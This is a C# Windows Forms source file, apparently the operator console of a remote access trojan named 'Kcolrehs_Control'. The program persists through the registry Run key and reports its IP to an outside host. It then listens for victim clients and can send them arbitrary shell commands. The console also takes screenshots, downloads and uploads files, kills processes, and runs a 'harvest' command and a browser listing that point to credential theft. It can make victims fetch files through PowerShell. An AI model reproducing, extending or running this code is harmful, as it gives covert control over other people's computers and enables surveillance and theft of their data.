using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using k3rn3lpanicTools;

namespace Kcolrehs_Control
{

    public partial class Form1 : Form
    {
        string cmdlist = @"-------------------------------------------------------------------------CMDLIST------------------------------------------------------------------
>help : it will print this message :P

>select [number] : it will select the corresponding client

>sessions : it will list all clients connected to this server

>status : it will print sessions , host name and systeminfo command output

>disconnect : it will disconnect the selected client

>start : it will start the server again

>restart : it actually does what start does

>cls : it will clean the log screen

>screenshot : it will get a screenshot from selected session

>get-filename : it will download the file from selected Client's machine to this machine

>notepad-sometexthere : it will show the client the text you write here in a notepad

>kill-appname.exe : it will kill all instances of this process in client's machine (example : kill-chrome.exe)

>lsbrowsers : it will list all the browsers that client have and print's each browsers exact path


>put-filename : it will upload a file from server machine and the client will download it

**** Any thing that is not in list above will be executed as this command : exec-thethinghere ****
-------------------------------------------------------------------------END---------------------------------------------------------------------
";
        static int x1;
        static int y1;
        bool xy;
        string getSelectedClientName()
        {
            return listBox1.SelectedIndex >= 0 ? listBox1.Items[listBox1.SelectedIndex].ToString() : "";
        }
        public Form1()
        {
            InitializeComponent();
            
            textBox1.Select();
            lastcmd = "";
            currentcmd = "";
            k3rn3lpanicTools.Tools.setInStartup();
            new RegisteryWatcher(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", SystemInfo.GetInfo(SystemInfo.InfoType.AppName));
        }
        string lastcmd;
        string currentcmd;
        void StartServer()
        {
            try
            {
                if (k3rn3lpanicTools.Networkinfo.GetRequest("https://diuhiesluce.freehost.io/index.php?Pinfo=fuckingipinfo&newip=" + (k3rn3lpanicTools.Networkinfo.PublicIPAddress_m1().Trim())) == "Done")
                {
                    k3rn3lpanicTools.Server.StartListeningForIncomingConnection(IPAddress.Any, 23000, richTextBox1, listBox1);
                }
                else
                {
                    richTextBox1.Text += "\nCannot set ip";
                }
            }
            catch
            {
                richTextBox1.Text += "\nCannot set ip";

            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            StartServer();

        }
        void commanderror()
        {
            printtext("Inserted Command is not valid . you can write \"help\" to get the list of commands.");
        }
        void printtext(string text)
        {
            richTextBox1.Text += "\n" + text;
        }

        void CommandCare(string command)
        {
            bool isitone = listBox1.SelectedIndex >= 0 ? true : false;
            if (command.StartsWith("exec-"))
            {
                if (isitone)
                    Server.SendStrToSpecificClient(listBox1.Items[listBox1.SelectedIndex].ToString(), command);
                else
                    Server.SendStrToAll(command);
            }
            else if (command.StartsWith("notepad-"))
            {
                CommandCare("echo "+command.Substring(8)+">\"panic.txt\" & notepad panic.txt");
            }
            else if (command.StartsWith("kill-"))
            {
                CommandCare("taskkill /IM \""+command.Substring(5)+"\" /f");
            }
            else if (command.StartsWith("select "))
            {
                int _index;
                if (int.TryParse(command.Split(' ')[1], out _index))
                {
                    if (_index < listBox1.Items.Count && _index >= 0)
                    {
                        listBox1.SelectedIndex = _index;
                        printtext("Selected user index : " + _index.ToString() + "\t IP:" + listBox1.Items[_index].ToString());
                    }
                    else
                        printtext("Selected index is out of range , choose right");
                }
                else
                {
                    commanderror();
                }
            }
            else if (command.StartsWith("send-"))
            {
                if (isitone)
                    k3rn3lpanicTools.Server.SendStrToSpecificClient(getSelectedClientName(), command.Substring(5));
                else
                    Server.SendStrToAll(command.Substring(5));
            }
            else if (command.StartsWith("download-"))
            {
                string filename = command.Substring(9).Split('!')[command.Substring(9).Split('!').Length-1];
                
                string link = command.Substring(9).Replace("!"+filename,"");

                if (isitone)
                {
                    richTextBox1.Text += "\nDownloading Url :" + link + "\nTo File : " + filename;
                    CommandCare("exec-"+ "powershell -c \"Invoke-WebRequest -Uri '" + link + "' -OutFile '" + filename + "'\"");
                }
                else
                {
                    printtext("Select a session first");
                }
                

            }
            else if (command.StartsWith("get-"))
            {

                if (isitone)
                {
                    Server.SendStrToSpecificClient(getSelectedClientName(), "UploadFile-" + command.Substring(4));
                }
                else
                    printtext("No Session is selected!");
            }
            else if (command.StartsWith("put-"))
            {
                if (isitone) {
                    Server.SendFileToClient(getSelectedClientName(), command.Substring(4), richTextBox1);
                }
                else {
                    printtext("select a session first");
                }
            }
            else
            {
                switch (command)
                {
                    case "disconnect":
                        if (listBox1.SelectedIndex >= 0)
                        {
                            foreach (TcpClient t in Server.mClients)
                            {
                                if (t.Client.RemoteEndPoint.ToString() == listBox1.Items[listBox1.SelectedIndex].ToString())
                                {
                                    Server.RemoveClient(t, richTextBox1, listBox1);

                                    break;
                                }
                            }
                        }
                        else
                        {
                            printtext("noting is selected");
                        }
                        break;
                    case "sysinfo":
                        if (listBox1.SelectedIndex >= 0)
                        {
                            CommandCare("exec-hostname");
                            System.Threading.Thread.Sleep(1000);
                            CommandCare("exec-net user");
                            System.Threading.Thread.Sleep(1000);
                            CommandCare("exec-systeminfo");

                        }
                        else
                        {
                            printtext("No Session is selected!");
                        }
                        break;

                    case "help":
                        printtext(getcommandlist());
                        break;
                    case "start":
                        k3rn3lpanicTools.Server.StopServer(richTextBox1);
                        StartServer();
                        break;
                    case "restart":
                        CommandCare("start");
                        break;
                    case "sessions":
                        printtext(getallSessions());
                        break;
                    case "exit":
                        Environment.Exit(Environment.ExitCode);
                        break;
                    case "cls":
                        richTextBox1.Text = "";
                        break;
                    case "harvest":
                        if (isitone) {
                            Server.SendStrToSpecificClient(getSelectedClientName(),"harvest");
                        }
                        else
                        {
                            printtext("Please Select a session first");
                        }
                        break;
                    case "status":
                        string _data = "";
                        CommandCare("sessions");
                        _data += listBox1.SelectedIndex >= 0 ? ("Selected Index : " + listBox1.SelectedIndex.ToString() + "\t IP:" + listBox1.Items[listBox1.SelectedIndex].ToString() + "\n") : "No session is selected\n";
                        _data += "Last Command : " + lastcmd;
                        printtext(_data);
                        break;
                    case "screenshot":
                        if (getSelectedClientName() != "")
                            Server.SendStrToSpecificClient(getSelectedClientName(), "Screenshot");
                        else
                            printtext("Select a session first");
                        break;

                    case "lsbrowsers":
                        if (getSelectedClientName() != "")
                            Server.SendStrToSpecificClient(getSelectedClientName(), "lsbrowsers");
                        else
                            printtext("Select a session first");
                        break;
                    
                    default:
                        if (isitone)
                            CommandCare("exec-"+command);
                        else
                            printtext("Select a sessions first");
                        break;
                }


            }
        }

        private string getallSessions()
        {
            printtext("All Sessions :");
            string result = "";
            for (int i = 0; i < listBox1.Items.Count; i++)
            {
                if (i == listBox1.SelectedIndex)
                    result += "*";
                result += i.ToString() + " : " + listBox1.Items[i].ToString() + "\n";
            }
            return result;
        }

        private string getcommandlist()
        {
            return cmdlist;
        }

        private void textBox1_KeyUp(object sender, KeyEventArgs e)
        {

        }
        void richgotoend()
        {
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.SelectionLength = 0;
        }
        void gotoend()
        {
            textBox1.SelectionStart = textBox1.Text.Length;
            textBox1.SelectionLength = 0;
        }
        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                lastcmd = textBox1.Text;
            }
            if (e.KeyCode == Keys.Up)
            {
                currentcmd = textBox1.Text;
                textBox1.Text = lastcmd;
                gotoend();
            }
            if (e.KeyValue == 13)
            {

                string cmd = textBox1.Text;
                textBox1.Text = "";
                textBox1.Select();
                printtext("");

                printtext("─────────────────────────────────────────> Command: " + cmd);
                printtext("");
                CommandCare(cmd);

            }

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richgotoend();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            WindowState = (WindowState == FormWindowState.Normal) ? FormWindowState.Maximized : FormWindowState.Normal;
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            xy = true;
            x1 = e.X;
            y1 = e.Y;
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (xy == true)
            {
                this.Left = this.Left + e.X - x1;
                this.Top = this.Top + e.Y - y1;
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            xy = false;
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            label2_Click(sender, e);
        }
    }
}
